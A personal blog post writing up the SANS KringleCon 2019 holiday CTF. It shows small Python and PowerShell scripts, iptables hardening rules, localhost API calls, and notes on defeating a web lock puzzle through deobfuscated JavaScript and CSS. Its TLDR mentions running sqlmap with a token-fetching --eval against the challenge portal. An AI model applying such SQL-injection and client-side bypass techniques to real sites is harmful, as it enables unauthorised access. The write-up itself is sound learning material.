<!DOCTYPE html>
<html lang="en">
<head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="generator" content="Pelican" />
        <title>There is IT in Helsinki - python</title>
        <link rel="stylesheet" href="/theme/css/main.css" />
        <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="There is IT in Helsinki Atom Feed" />
</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="/">There is IT in Helsinki</a></h1>
                <nav><ul>
                    <li><a href="/category/finland.html">finland</a></li>
                    <li><a href="/category/it.html">it</a></li>
                    <li><a href="/category/storage.html">storage</a></li>
                </ul></nav>
        </header><!-- /#banner -->

            <aside id="featured" class="body">
                <article>
                    <h1 class="entry-title"><a href="/kringlecon-2019-write-up.html">"Kringlecon 2019 Write-Up"</a></h1>
<footer class="post-info">
        <abbr class="published" title="2020-01-15T00:00:00+02:00">
                Published: "2020-01-15"
        </abbr>

        <address class="vcard author">
                By                         <a class="url fn" href="/author/johan-guldmyr.html">Johan Guldmyr</a>
        </address>
<p>In <a href="/category/it.html">it</a>.</p>
<p>tags: <a href="/tag/ctf.html">ctf</a> <a href="/tag/pdftotext.html">pdftotext</a> <a href="/tag/python.html">python</a> <a href="/tag/programming.html">programming</a> <a href="/tag/language.html">language</a> <a href="/tag/security.html">security</a> <a href="/tag/sudo.html">sudo</a> <a href="/tag/trail.html">trail</a> <a href="/tag/of.html">of</a> <a href="/tag/tears.html">tears</a> </p>
</footer><!-- /.post-info --><h2>The challenges!</h2>
<p>Hoe the season to be jolly! Been giving a few <a href="https://en.wikipedia.org/wiki/Capture_the_flag_(disambiguation)">CTFs</a>  lately. It started with the disobey 2020 <a href="https://disobey2020.github.io/">puzzle</a> to get the hacker ticket. Then there was the <a href="https://overthewire.org/">OverTheWire</a>'s 2019 advent CTF. And finally this one, the SANS holiday hackmechallenge - <a href="https://holidayhackchallenge.com/2019/">KringleCon</a> 2019. As of writing I got what felt like quite far in the disobey but got real nice stuck in the second keyhole. For OTF I found a similar but slightly easier challenge on the 6th day December, but did not manage to get the key. Most others except the first and challenge-zero I didn't really have time for. So with not so much progress it was very nice to take a step back and try out KringleCon where I managed to get a bit further!</p>
<p>[su_accordion] [su_spoiler title="TLDR"]</p>
<p>Short tldr of methods to answers to the objectives</p>
<ol>
<li>talkt to santa: go upupuppu and click click click :)</li>
<li>find turtle doves: mm they were in the union</li>
<li>unredact: at the time I was on ski holiday so used <strong>termux</strong> on my phone and installed <strong>pdf2txt</strong> there to unredact it :) Fun to use the phone :)</li>
<li>windows event log outcome: clicked around until I found something that looked suspicious. I think it was a filename that looked sensitive.</li>
<li>windows event log technique: parsed these with python to print command_line and procerss_name the cat</li>
<li>network log - compromised system: got it to print IPs with python</li>
<li>splunk: followed the chat, was quite a nice way to learn the tool. Finding the correct file in the archive was a bit tricky, had to read through the chats carefully several times :)</li>
<li>steam tunnels: the physical key! Spent quite some time wandering around trying to find the key. Eventually gave up. Then tried again after making it into the sleigh shop and hey there it was :) Couldn't really get the decoder to line up so used pixels mostly, took 5 times or so :)</li>
<li>captcha: super fun, most fun. Hadn't tensorflowed before. Followed the youtube and github repo basically. Used an 80core 365GB cloud instance from $dayjob for a short while as the 2core 2GB RAM instance I used was too small ;)</li>
<li>scraps: hadn't used sqlmap before either. First mapped out the page manually to find the forms. Then learnt about sqlmap --crawl :) Money shot for me was --eval="import requests;token=requests.get('https://studentportal.elfu.org/validator.php').text"</li>
<li>elfscrow: So. Hard. Learnt a bit more assembly reading. Used IDA this time instead of my previous attempts with radare2. Wonder when I'll get better at these :)</li>
<li>sleigh shop door. also very fun to unlock those locks! Did not solve it under 5s but the one slower than that.</li>
<li>filter out poisoned: ugh this one was tedious. Actually this and previous I did spend some time trying to learn them, but in the end found a write-up that was published too early (and later removed but still in google cache..)
[/su_spoiler] [/su_accordion]</li>
</ol>
<h2>Getting on with it!</h2>
<ul>
<li>The pdf deobfuscate I could do on my phone in termux just a pkg install pdftotext :)</li>
<li>The nyancat took a bit of more time than I should admit, but primarily I forgot how sudo works and what sudo -u does..</li>
<li>The frosty keypad I got to write a small python script: (also on a wall somewhere :)</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">random</span>

<span class="c1">#numbers = [ 1, 3, 7 ]</span>

<span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">length</span> <span class="o">=</span> <span class="mi">4</span>
<span class="n">digits</span> <span class="o">=</span> <span class="mi">1337</span>

<span class="c1"># from https://linuxconfig.org/function-to-check-for-a-prime-number-with-python</span>
<span class="k">def</span> <span class="nf">is_prime_number</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
  <span class="k">if</span> <span class="n">x</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">x</span><span class="p">):</span>
      <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span> <span class="n">x</span> <span class="o">%</span> <span class="n">y</span> <span class="p">):</span>
        <span class="k">return</span><span class="p">(</span><span class="kc">False</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">return</span><span class="p">(</span><span class="kc">False</span><span class="p">)</span>
  <span class="k">return</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>

<span class="c1"># from https://trinket.io/python3/00754ec904</span>
<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">results</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1000</span><span class="p">:</span>
     <span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
       <span class="n">digits</span> <span class="o">=</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
       <span class="k">if</span> <span class="s2">&quot;3&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="s2">&quot;1&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="s2">&quot;7&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;0&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;2&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;4&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;5&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;6&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;8&quot;</span> <span class="ow">in</span> <span class="n">digits</span> <span class="ow">and</span> <span class="ow">not</span> <span class="s2">&quot;9&quot;</span> <span class="ow">in</span> <span class="n">digits</span><span class="p">:</span>
         <span class="k">if</span> <span class="n">digits</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
           <span class="k">if</span> <span class="n">is_prime_number</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">digits</span><span class="p">)):</span>
             <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span>
             <span class="nb">print</span><span class="p">(</span><span class="n">digits</span><span class="p">)</span>
</code></pre></div>

<p>You'll need to hit CTRL+C when it doesn't find any more solutions. It's not the fastest, has unused bits and I don't know why it has the for digit in range(1) bit.</p>
<h2>On to the next challenge!:</h2>
<ul>
<li>The windows events log file I just opened the file on a Windows machine and looked around</li>
<li>The sysmon file I printed some interesting keys in the json strings with a tiny python script</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;sysmon-data.json&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">json_file</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">json_file</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;command_line&#39;</span><span class="p">])</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="s1">&#39;process_name&#39;</span><span class="p">])</span>
</code></pre></div>

<ul>
<li>For the splunk basically just followed the chats. A bit tricky to be fair! By luck I had managed to already download the correct file from the Archive but did not look at it deep enough..</li>
<li>For the greylog just clicked around. I liked the "quick table" feature and that got me some of the questions fairly quickly without having to write more narrow searches. Quite a few steps needed for this so took some time. It was nice to get to compare greylog and splunk, I've only used a vanilla ELK stack before and last version 5. With that in mind the discover data was for me a bit easier on greylog.</li>
<li>Trail of tears I just beat the game on easy :) (<em>/edit turns</em> one can solve this on hard</li>
</ul>
<h2>Next one was a powershell one! The laser adjuster :P</h2>
<p>Finally got to get a bit familiar with powershell. I'm a lurker on <a href="https://www.reddit.com/r/sysadmin/">r/sysadmin</a> and very often there are powershell oneliners on display there. This was quite a fun one to be honest :) Kind of like using python directly in the shell.</p>
<p>Some things I learnt were:</p>
<ul>
<li>Get-History shows stuff! But no .bash_history so I actually wonder where this history is from? It's not in .local/powershell...</li>
<li>Trying to bruteforce this one manually was very slow so I gave that up fairly quickly.</li>
<li>I tried to find a way into reading the python code that powered the website. Only found the process id but no open files visible. Would need to get root for that I suppose..</li>
<li>figured out how to -X POST a body for the gases!</li>
<li>hints in chat suggested powering off and on</li>
<li>$env has things!</li>
<li>Format-Hex -Path ./archive | Select-Object -First 1<ul>
<li>magic number 50 4B 03 == zip</li>
<li>expand-archive</li>
<li>chmod +x</li>
<li>get-content riddle # Gives an md5sum</li>
</ul>
</li>
<li>md5sum hunter</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="nv">$files</span> <span class="p">=</span> <span class="nb">Get-childitem</span> <span class="n">-Path</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">elf</span><span class="p">/</span><span class="n">depths</span> <span class="n">-recurse</span> <span class="o">-File</span>
<span class="k">Foreach</span> <span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nv">$files</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="k">if</span><span class="p">((</span><span class="nb">Get-FileHash</span> <span class="n">-Path</span> <span class="nv">$file</span><span class="p">.</span><span class="n">fullname</span> <span class="n">-Algorithm</span> <span class="n">MD5</span><span class="p">).</span><span class="n">hash</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">25520151A320B5B0D21561F92C8F6224</span><span class="p">){</span>
       <span class="nv">$file</span>
     <span class="p">}</span>
 <span class="p">}</span>
</code></pre></div>

<p>Could have found this with a recurse grep for temperature -e angle -e param..</p>
<p>The solution:</p>
<div class="highlight"><pre><span></span><code><span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">off</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span><span class="w">                                       </span><span class="o">$</span><span class="nt">correct_gases_postbody</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="p">{</span><span class="err">O=&#39;6&#39;</span><span class="p">;</span><span class="err">H=&#39;7&#39;</span><span class="p">;</span><span class="err">He=&#39;3&#39;</span><span class="p">;</span><span class="err">N=&#39;4&#39;</span><span class="p">;</span><span class="err">Ne=&#39;22&#39;</span><span class="p">;</span><span class="err">Ar=&#39;11&#39;</span><span class="p">;</span><span class="err">Xe=&#39;10&#39;</span><span class="p">;</span><span class="err">F=&#39;20&#39;</span><span class="p">;</span><span class="err">Kr=&#39;8&#39;</span><span class="p">;</span><span class="err">Rn=&#39;9&#39;</span><span class="p">}</span><span class="w">      </span><span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">gas</span><span class="w"> </span><span class="nt">-Method</span><span class="w"> </span><span class="nt">POST</span><span class="w"> </span><span class="nt">-Body</span><span class="w"> </span><span class="o">$</span><span class="nt">correct_gases_postbody</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
<span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">angle</span><span class="o">?</span><span class="nt">val</span><span class="o">=</span><span class="nt">65</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
<span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">temperature</span><span class="o">?</span><span class="nt">val</span><span class="o">=</span><span class="nt">-33</span><span class="p">.</span><span class="nc">5</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
<span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">127</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">refraction</span><span class="o">?</span><span class="nt">val</span><span class="o">=</span><span class="nt">1</span><span class="p">.</span><span class="nc">867</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
<span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">on</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
<span class="o">(</span><span class="nt">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="p">:</span><span class="nd">1225</span><span class="o">/</span><span class="nt">api</span><span class="o">/</span><span class="nt">output</span><span class="o">)</span><span class="p">.</span><span class="nc">RawContent</span>
</code></pre></div>

<h2>iptables</h2>
<ul>
<li>Iptables/ smart bracelet one: think I was close or did complete this but Kent did not agree? Went back and tried this again slowly by first writing the commands in a text file</li>
</ul>
<div class="highlight"><pre><span></span><code>#1
sudo iptables -P FORWARD DROP

sudo iptables -P INPUT DROP

sudo iptables -P OUTPUT DROP

#2
# shouldbe in two lines? as the iptables output orders them related,established..
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

#3
sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT

#4
sudo iptables -A INPUT -p tcp --dport 21 -s 0.0.0.0/0 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -s 0.0.0.0/0 -j ACCEPT

#5
sudo iptables -A OUTPUT -p tcp --dport 80 -d 0.0.0.0/0 -j ACCEPT

#6
sudo iptables -A INPUT -i lo -j ACCEPT

Kent TinselTooth: Great, you hardened my IOT Smart Braces firewall!
</code></pre></div>

<ul>
<li><em>Sled Route API : Got the login. Next to figure out which requests were bad and how to fill in 100 on the web page... Maybe one can figure out the firewall API? Hmm played a bit with elasticsearch.. then gave up.. in the meantime went ahead to:</em></li>
</ul>
<h2>Sleigh Shop Door</h2>
<ul>
<li>Ah this isfun! While poking through the web source after fixing the smartbracelet found the URL to the sleigh shop in teh source. It had a bunch of locks.</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="n">haha</span><span class="o">!</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">reload</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="n">needed</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">different</span><span class="o">!</span>

<span class="mf">1.</span><span class="w"> </span><span class="n">B46DU583</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">top</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">console</span>
<span class="mf">2.</span><span class="w"> </span><span class="n">XNUBLBKW</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">lookingin</span><span class="w"> </span><span class="n">ctrl</span><span class="w"> </span><span class="n">p</span>
<span class="mf">3.</span><span class="w"> </span><span class="n">unknown</span><span class="p">,</span><span class="w"> </span><span class="n">fetched</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">never</span><span class="w"> </span><span class="n">shown</span><span class="o">..</span>

<span class="n">ha</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">funneh</span><span class="p">,</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">clicking</span><span class="w"> </span><span class="n">around</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">tabs</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">javascript</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">needed</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">deobfuscate</span><span class="o">/</span><span class="n">jsnice</span><span class="o">.</span><span class="n">org</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="k">var</span><span class="w"> </span><span class="n">_0x1e21</span>

<span class="n">so</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">ran</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">console</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">values</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">statements</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">eventually</span><span class="p">:</span>

<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">_0x1e21</span><span class="p">[</span><span class="s2">&quot;jIdunh&quot;</span><span class="p">]);</span>

<span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">printed</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">bunch</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">things</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">element</span><span class="w"> </span><span class="mi">34</span><span class="w"> </span><span class="n">had</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">image</span><span class="p">:</span>

<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="n">_0x1e21</span><span class="p">[</span><span class="s2">&quot;jIdunh&quot;</span><span class="p">][</span><span class="mi">34</span><span class="p">]);</span>
<span class="n">VM3008</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">images</span><span class="o">/</span><span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="o">.</span><span class="n">png</span>

<span class="n">which</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">combination</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="mi">3</span><span class="n">rd</span><span class="w"> </span><span class="n">lock</span>

<span class="mf">4.</span><span class="w"> </span><span class="n">ILMJRNTP</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">storage</span>
<span class="mi">5</span><span class="w"> </span><span class="n">CJ4WCMG4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;&lt;/</span><span class="n">title</span><span class="o">&gt;</span>

<span class="mf">6.</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">card</span><span class="o">..</span><span class="w"> </span><span class="n">Y3WJVE01</span><span class="w"> </span><span class="n">sticker</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">removes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">hologram</span><span class="w"> </span><span class="n">CSS</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">letters</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">different</span><span class="w"> </span><span class="n">order</span><span class="w"> </span><span class="n">JYV0EW13</span><span class="o">.</span><span class="w"> </span>
<span class="mf">7.</span><span class="w"> </span><span class="n">G7LDS1LS</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">font</span><span class="w"> </span><span class="n">family</span>

<span class="mi">8</span><span class="w"> </span><span class="n">VERONICA</span><span class="w"> </span><span class="n">In</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">event</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="o">.</span><span class="n">eggs</span><span class="w"> </span><span class="n">go</span><span class="w"> </span><span class="n">bad</span><span class="p">,</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">must</span><span class="w"> </span><span class="n">figure</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="n">who</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">sad</span><span class="o">.</span>
<span class="n">From</span><span class="w"> </span><span class="n">client</span><span class="o">.</span><span class="n">js</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">then</span><span class="w"> </span><span class="n">deobfuscated</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">make</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">bit</span><span class="w"> </span><span class="n">readable</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">through</span>

<span class="mi">9</span><span class="w"> </span><span class="mi">8</span><span class="n">SEOGRW1</span>
<span class="n">chakra</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">css</span><span class="w"> </span><span class="n">file</span>

<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">sleighworkshopdoor</span><span class="o">.</span><span class="n">elfu</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">css</span><span class="o">/</span><span class="n">styles</span><span class="o">.</span><span class="n">css</span><span class="o">/</span><span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span>
<span class="mf">10.</span><span class="w"> </span><span class="n">compopnent</span><span class="o">.</span><span class="n">swab</span><span class="p">,</span><span class="w"> </span><span class="n">bunch</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">things</span><span class="w"> </span><span class="n">around</span><span class="w"> </span><span class="n">lock</span><span class="w"> </span><span class="n">c10</span>

<span class="n">finding</span><span class="w"> </span><span class="o">.</span><span class="n">locks</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">li</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">lock</span><span class="o">.</span><span class="n">c10</span><span class="w"> </span><span class="o">.</span><span class="n">cover</span>

<span class="n">one</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">remove</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cover</span>

<span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">board</span><span class="w"> </span><span class="n">there</span><span class="s1">&#39;s a code: KD29XJ37</span>

<span class="n">but</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">codes</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">session</span><span class="o">..</span>

<span class="n">console</span><span class="o">.</span><span class="n">log</span><span class="w"> </span><span class="n">says</span><span class="w"> </span><span class="s2">&quot;Missing macaroni&quot;</span>

<span class="n">In</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="n">there</span><span class="s1">&#39;s:</span>

<span class="w"> </span><span class="n">console</span><span class="p">[</span><span class="s2">&quot;log&quot;</span><span class="p">](</span><span class="s2">&quot;Well done! Here&#39;s the password:&quot;</span><span class="p">);</span>
<span class="w"> </span><span class="n">console</span><span class="p">[</span><span class="n">_0x1e21</span><span class="p">(</span><span class="s2">&quot;0x45&quot;</span><span class="p">)](</span><span class="s2">&quot;</span><span class="si">%c</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="s2">&quot;reward&quot;</span><span class="p">],</span><span class="w"> </span><span class="n">_0x1e21</span><span class="p">(</span><span class="s2">&quot;0x46&quot;</span><span class="p">));</span>

<span class="n">In</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">console</span><span class="w"> </span><span class="n">there</span><span class="s1">&#39;s this whenever one presses the unlock:</span>

<span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="n">Error</span><span class="p">:</span><span class="w"> </span><span class="n">Missing</span><span class="w"> </span><span class="n">macaroni</span><span class="o">!</span>
<span class="w">    </span><span class="n">at</span><span class="w"> </span><span class="n">HTMLButtonElement</span><span class="o">.&lt;</span><span class="n">anonymous</span><span class="o">&gt;</span><span class="w"> </span><span class="p">(</span><span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span><span class="p">)</span>
<span class="p">(</span><span class="n">anonymous</span><span class="p">)</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="mi">73</span><span class="n">cda8f4</span><span class="o">-</span><span class="mi">6</span><span class="n">dc7</span><span class="o">-</span><span class="mi">4</span><span class="n">edc</span><span class="o">-</span><span class="n">adb8</span><span class="o">-</span><span class="n">b2bd4b3ecd12</span><span class="p">:</span><span class="mi">1</span>

<span class="n">there</span><span class="s1">&#39;s a bunch of &quot;&lt;div class=&quot;component gnome, mac, swab&quot; with data-codes: XJ0 A33 J39</span>

